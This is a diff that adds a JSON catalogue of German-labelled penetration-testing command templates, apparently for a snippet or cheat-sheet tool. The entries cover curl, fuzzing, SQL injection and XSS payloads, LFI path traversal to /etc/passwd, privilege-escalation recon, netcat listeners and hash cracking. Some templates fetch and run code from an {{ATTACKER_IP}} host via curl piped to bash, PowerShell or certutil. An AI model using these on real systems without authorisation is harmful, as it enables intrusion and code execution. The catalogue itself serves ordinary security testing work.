@@ -1,0 +1,352 @@
+{
+  "categories": [
+    {
+      "id": "web_http",
+      "name": "🌐 Web Application & HTTP",
+      "icon": "🌐",
+      "snippets": [
+        {
+          "id": "curl_get_headers",
+          "title": "Curl: Request mit Custom Headers",
+          "category": "Web Application & HTTP",
+          "subcategory": "Curl & Wget",
+          "description": "Sendet GET-Request mit benutzerdefiniertem Header und User-Agent",
+          "template": "curl -i -s -H \"User-Agent: Mozilla/5.0\" -H \"X-Forwarded-For: {{ATTACKER_IP}}\" http://{{TARGET_IP}}:{{PORT}}/",
+          "tags": ["curl", "http", "headers", "web"]
+        },
+        {
+          "id": "curl_post_json",
+          "title": "Curl: POST Request mit JSON Body",
+          "category": "Web Application & HTTP",
+          "subcategory": "Curl & Wget",
+          "description": "Sendet POST-Daten als application/json",
+          "template": "curl -X POST http://{{TARGET_IP}}:{{PORT}}/api/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin\",\"password\":\"password\"}'",
+          "tags": ["curl", "post", "json", "api", "web"]
+        },
+        {
+          "id": "curl_burp_proxy",
+          "title": "Curl: Durch lokalen Burp Suite / ZAP Proxy leiten",
+          "category": "Web Application & HTTP",
+          "subcategory": "Curl & Wget",
+          "description": "Routet den Request über einen lokalen Proxy auf Port 8080",
+          "template": "curl -k -x http://127.0.0.1:8080 http://{{TARGET_IP}}:{{PORT}}/",
+          "tags": ["curl", "proxy", "burp", "zap", "debug"]
+        },
+        {
+          "id": "curl_download_exec",
+          "title": "Curl: Remote Skript direkt in Bash ausführen",
+          "category": "Web Application & HTTP",
+          "subcategory": "Curl & Wget",
+          "description": "Lädt ein Shell-Skript vom Attacker-Server und führt es im Speicher aus",
+          "template": "curl -s http://{{ATTACKER_IP}}:{{PORT}}/script.sh | bash",
+          "tags": ["curl", "download", "bash", "execute"]
+        },
+        {
+          "id": "gobuster_dir",
+          "title": "Gobuster: Verzeichnis-Fuzzing (Dirbuster)",
+          "category": "Web Application & HTTP",
+          "subcategory": "Fuzzing & Discovery",
+          "description": "Standard Directory Enumeration mit SecLists und Dateiendungen",
+          "template": "gobuster dir -u http://{{TARGET_IP}}:{{PORT}}/ -w {{WORDLIST}} -x php,txt,html,js -t 50",
+          "tags": ["gobuster", "fuzzing", "discovery", "dir"]
+        },
+        {
+          "id": "ffuf_directory",
+          "title": "FFUF: Schneller Directory Fuzzing Scan",
+          "category": "Web Application & HTTP",
+          "subcategory": "Fuzzing & Discovery",
+          "description": "Fuzzing mit Auto-Calibration und Statuscode-Filter",
+          "template": "ffuf -u http://{{TARGET_IP}}:{{PORT}}/FUZZ -w {{WORDLIST}} -e .php,.txt,.html -mc 200,204,301,302,307,401,403",
+          "tags": ["ffuf", "fuzzing", "web", "discovery"]
+        },
+        {
+          "id": "sqli_auth_bypass",
+          "title": "SQLi: Klassische Auth-Bypass Payloads",
+          "category": "Web Application & HTTP",
+          "subcategory": "SQL Injection",
+          "description": "Häufige Login-Formular Bypass Teststrings",
+          "template": "admin' --\nadmin' #\n' or 1=1--\n' or 1=1#\n' or '1'='1",
+          "tags": ["sqli", "sql", "login", "bypass", "web"]
+        },
+        {
+          "id": "sqli_union_version",
+          "title": "SQLi: UNION SELECT Versionsabfrage",
+          "category": "Web Application & HTTP",
+          "subcategory": "SQL Injection",
+          "description": "Versionsabfrage für MySQL / PostgreSQL / SQLite via UNION",
+          "template": "' UNION SELECT 1, @@version, 3, 4-- -",
+          "tags": ["sqli", "union", "mysql", "version"]
+        },
+        {
+          "id": "xss_test_tags",
+          "title": "XSS: Reflected & Stored Test Payloads",
+          "category": "Web Application & HTTP",
+          "subcategory": "Cross-Site Scripting (XSS)",
+          "description": "Standard PoC Payloads zur Verifikation von XSS-Schwachstellen",
+          "template": "<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<details open ontoggle=alert(1)>",
+          "tags": ["xss", "web", "alert", "javascript"]
+        },
+        {
+          "id": "lfi_php_wrappers",
+          "title": "LFI: PHP Base64 Filter Wrapper",
+          "category": "Web Application & HTTP",
+          "subcategory": "File Inclusion (LFI)",
+          "description": "Liest Quellcode von PHP-Dateien als Base64 kodierten Text aus",
+          "template": "http://{{TARGET_IP}}:{{PORT}}/index.php?page=php://filter/convert.base64-encode/resource=index.php",
+          "tags": ["lfi", "php", "wrapper", "base64", "traversal"]
+        },
+        {
+          "id": "lfi_null_byte",
+          "title": "LFI: Path Traversal zu /etc/passwd",
+          "category": "Web Application & HTTP",
+          "subcategory": "File Inclusion (LFI)",
+          "description": "Klassischer LFI-Pfad mit Directory Traversal",
+          "template": "http://{{TARGET_IP}}:{{PORT}}/index.php?file=../../../../../../etc/passwd",
+          "tags": ["lfi", "traversal", "passwd", "linux"]
+        }
+      ]
+    },
+    {
+      "id": "linux_shell",
+      "name": "🐧 Linux Shell & System",
+      "icon": "🐧",
+      "snippets": [
+        {
+          "id": "find_suid",
+          "title": "SUID Binaries finden",
+          "category": "Linux Shell & System",
+          "subcategory": "Recon & Permissions",
+          "description": "Sucht alle ausführbaren Dateien mit gesetztem SUID-Bit",
+          "template": "find / -perm -u=s -type f 2>/dev/null",
+          "tags": ["linux", "suid", "privesc", "permissions", "find"]
+        },
+        {
+          "id": "find_writable",
+          "title": "Schreibbare Verzeichnisse finden",
+          "category": "Linux Shell & System",
+          "subcategory": "Recon & Permissions",
+          "description": "Findet alle für jedermann beschreibbaren Ordner",
+          "template": "find / -writable -type d 2>/dev/null | grep -v '/proc' | grep -v '/sys'",
+          "tags": ["linux", "writable", "permissions", "recon"]
+        },
+        {
+          "id": "find_capabilities",
+          "title": "Linux Capabilities auflisten",
+          "category": "Linux Shell & System",
+          "subcategory": "Recon & Permissions",
+          "description": "Listet Binaries mit speziellen Linux Capabilities auf",
+          "template": "getcap -r / 2>/dev/null",
+          "tags": ["linux", "capabilities", "privesc", "getcap"]
+        },
+        {
+          "id": "tty_python_upgrade",
+          "title": "TTY Shell Upgrade mit Python",
+          "category": "Linux Shell & System",
+          "subcategory": "Shell Upgrades",
+          "description": "Verwandelt eine Dumb Shell in ein vollwertiges interaktives TTY",
+          "template": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Danach: Ctrl+Z drücken\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 38 columns 116",
+          "tags": ["linux", "tty", "shell", "python", "pty"]
+        },
+        {
+          "id": "python_http_server",
+          "title": "Python 3 HTTP File Server",
+          "category": "Linux Shell & System",
+          "subcategory": "File Transfers",
+          "description": "Startet schnellen Webserver zum Bereitstellen von Tools/Dateien",
+          "template": "python3 -m http.server {{PORT}}",
+          "tags": ["python", "http", "server", "transfer", "tools"]
+        },
+        {
+          "id": "linux_sudo_l",
+          "title": "Sudo Berechtigungen prüfen",
+          "category": "Linux Shell & System",
+          "subcategory": "Recon & Permissions",
+          "description": "Prüft, welche Befehle der aktuelle Benutzer mit sudo ausführen darf",
+          "template": "sudo -l",
+          "tags": ["sudo", "linux", "privesc", "permissions"]
+        },
+        {
+          "id": "base64_file_transfer",
+          "title": "Base64 Transfer (Auf Senderseite & Empfänger)",
+          "category": "Linux Shell & System",
+          "subcategory": "File Transfers",
+          "description": "Datei ohne Netzwerktransfer über Text-Clipboard übertragen",
+          "template": "# Sender:\nbase64 -w 0 < datei.bin\n\n# Empfaenger:\necho '<BASE64_STRING>' | base64 -d > datei.bin && chmod +x datei.bin",
+          "tags": ["base64", "transfer", "file", "linux"]
+        }
+      ]
+    },
+    {
+      "id": "windows_powershell",
+      "name": "🪟 Windows & PowerShell",
+      "icon": "🪟",
+      "snippets": [
+        {
+          "id": "win_whoami_priv",
+          "title": "Whoami Privileges & Groups",
+          "category": "Windows & PowerShell",
+          "subcategory": "Recon & Privileges",
+          "description": "Überprüft Privilegien (z. B. SeImpersonatePrivilege) und Gruppen",
+          "template": "whoami /priv\nwhoami /groups",
+          "tags": ["windows", "whoami", "privileges", "recon"]
+        },
+        {
+          "id": "win_ps_download",
+          "title": "PowerShell File Download (iwr / WebClient)",
+          "category": "Windows & PowerShell",
+          "subcategory": "File Transfers",
+          "description": "Lädt eine Datei vom Attacker-Host herunter",
+          "template": "powershell -c \"Invoke-WebRequest -Uri 'http://{{ATTACKER_IP}}:{{PORT}}/tool.exe' -OutFile 'tool.exe'\"\n# Alternative (WebClient):\npowershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://{{ATTACKER_IP}}:{{PORT}}/tool.exe', 'tool.exe')\"",
+          "tags": ["windows", "powershell", "download", "iwr"]
+        },
+        {
+          "id": "win_certutil_download",
+          "title": "Certutil File Download",
+          "category": "Windows & PowerShell",
+          "subcategory": "File Transfers",
+          "description": "Nutzt certutil.exe als Built-in Download-Cradle",
+          "template": "certutil.exe -urlcache -split -f http://{{ATTACKER_IP}}:{{PORT}}/tool.exe tool.exe",
+          "tags": ["windows", "certutil", "download", "file"]
+        },
+        {
+          "id": "win_net_enum",
+          "title": "Lokale Benutzer & Administratoren",
+          "category": "Windows & PowerShell",
+          "subcategory": "Recon & Privileges",
+          "description": "Listet Benutzer und Mitglieder der Administratorgruppe auf",
+          "template": "net user\nnet localgroup administrators",
+          "tags": ["windows", "net", "users", "administrators"]
+        }
+      ]
+    },
+    {
+      "id": "network_scanning",
+      "name": "📡 Network & Port Scanning",
+      "icon": "📡",
+      "snippets": [
+        {
+          "id": "nmap_initial",
+          "title": "Nmap: Initialer Standard-Scan",
+          "category": "Network & Port Scanning",
+          "subcategory": "Nmap Scans",
+          "description": "Schneller Scan der Top 1000 Ports mit Skripten und Versionserkennung",
+          "template": "nmap -sC -sV -oN nmap_initial.txt {{TARGET_IP}}",
+          "tags": ["nmap", "scan", "recon", "ports"]
+        },
+        {
+          "id": "nmap_full",
+          "title": "Nmap: Alle 65535 Ports scannen",
+          "category": "Network & Port Scanning",
+          "subcategory": "Nmap Scans",
+          "description": "Vollständiger Portscan aller TCP Ports mit Timing T4",
+          "template": "nmap -p- -T4 -oN nmap_allports.txt {{TARGET_IP}}",
+          "tags": ["nmap", "full", "scan", "ports"]
+        },
+        {
+          "id": "nmap_vuln",
+          "title": "Nmap: Schwachstellen-Skripte ausführen",
+          "category": "Network & Port Scanning",
+          "subcategory": "Nmap Scans",
+          "description": "Führt NSE-Vulnerability-Scans auf gefundenen Ports aus",
+          "template": "nmap --script vuln -p {{PORT}} -oN nmap_vuln.txt {{TARGET_IP}}",
+          "tags": ["nmap", "vuln", "nse", "scripts"]
+        },
+        {
+          "id": "nc_listener",
+          "title": "Netcat: Listener starten",
+          "category": "Network & Port Scanning",
+          "subcategory": "Netcat & Tunnels",
+          "description": "Startet einen lokalen TCP Listener auf dem gewünschten Port",
+          "template": "nc -lvnp {{PORT}}",
+          "tags": ["nc", "netcat", "listener", "port"]
+        },
+        {
+          "id": "ssh_local_port_forward",
+          "title": "SSH: Local Port Forwarding",
+          "category": "Network & Port Scanning",
+          "subcategory": "Port Forwarding & Tunnels",
+          "description": "Macht einen internen Remote-Port auf dem lokalen Host erreichbar",
+          "template": "ssh -L {{PORT}}:127.0.0.1:{{PORT}} user@{{TARGET_IP}} -N",
+          "tags": ["ssh", "tunnel", "forward", "network"]
+        }
+      ]
+    },
+    {
+      "id": "sql_databases",
+      "name": "🗄️ SQL & Databases",
+      "icon": "🗄️",
+      "snippets": [
+        {
+          "id": "mysql_cli_connect",
+          "title": "MySQL: CLI Verbindung",
+          "category": "SQL & Databases",
+          "subcategory": "Database Connections",
+          "description": "Verbindet sich mit einem MySQL / MariaDB Server",
+          "template": "mysql -u root -p -h {{TARGET_IP}} -P 3306",
+          "tags": ["mysql", "mariadb", "sql", "login"]
+        },
+        {
+          "id": "mysql_dump_schema",
+          "title": "MySQL: Datenbanken, Tabellen & Spalten abfragen",
+          "category": "SQL & Databases",
+          "subcategory": "Database Queries",
+          "description": "Standard Recon Abfragen für MySQL / MariaDB",
+          "template": "SHOW DATABASES;\nUSE <dbname>;\nSHOW TABLES;\nDESCRIBE <tablename>;\nSELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql';",
+          "tags": ["mysql", "schema", "tables", "information_schema"]
+        },
+        {
+          "id": "psql_cli_connect",
+          "title": "PostgreSQL: CLI Verbindung",
+          "category": "SQL & Databases",
+          "subcategory": "Database Connections",
+          "description": "Verbindet sich mit einem PostgreSQL Server",
+          "template": "psql -h {{TARGET_IP}} -p 5432 -U postgres -d template1",
+          "tags": ["postgres", "psql", "sql", "login"]
+        }
+      ]
+    },
+    {
+      "id": "crypto_encoding",
+      "name": "🔐 Crypto, Hashes & Encoding",
+      "icon": "🔐",
+      "snippets": [
+        {
+          "id": "base64_encode_decode",
+          "title": "Base64: Oneliner Encode / Decode",
+          "category": "Crypto, Hashes & Encoding",
+          "subcategory": "Encoding & Decoding",
+          "description": "Kodiert und dekodiert Strings via Bash",
+          "template": "# Encode:\necho -n 'Text to encode' | base64\n\n# Decode:\necho -n 'VGV4dCB0byBlbmNvZGU=' | base64 -d",
+          "tags": ["base64", "encode", "decode", "bash"]
+        },
+        {
+          "id": "url_encode_python",
+          "title": "URL Encode & Decode via Python Oneliner",
+          "category": "Crypto, Hashes & Encoding",
+          "subcategory": "Encoding & Decoding",
+          "description": "URL-kodiert oder dekodiert Strings direkt in der Konsole",
+          "template": "# URL Encode:\npython3 -c \"import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))\" \"text with spaces & chars\"\n\n# URL Decode:\npython3 -c \"import urllib.parse, sys; print(urllib.parse.unquote(sys.argv[1]))\" \"text%20with%20spaces\"",
+          "tags": ["url", "encode", "decode", "python"]
+        },
+        {
+          "id": "hashcat_rockyou",
+          "title": "Hashcat: Dictionary Attack mit RockYou",
+          "category": "Crypto, Hashes & Encoding",
+          "subcategory": "Hash Cracking",
+          "description": "Hashcat Syntax (Mode: 0=MD5, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt)",
+          "template": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
+          "tags": ["hashcat", "crack", "rockyou", "hashes"]
+        },
+        {
+          "id": "john_rockyou",
+          "title": "John the Ripper: Crack mit Wordlist",
+          "category": "Crypto, Hashes & Encoding",
+          "subcategory": "Hash Cracking",
+          "description": "John the Ripper mit Standard RockYou Wortliste",
+          "template": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt",
+          "tags": ["john", "crack", "rockyou", "hashes"]
+        }
+      ]
+    }
+  ]
+}
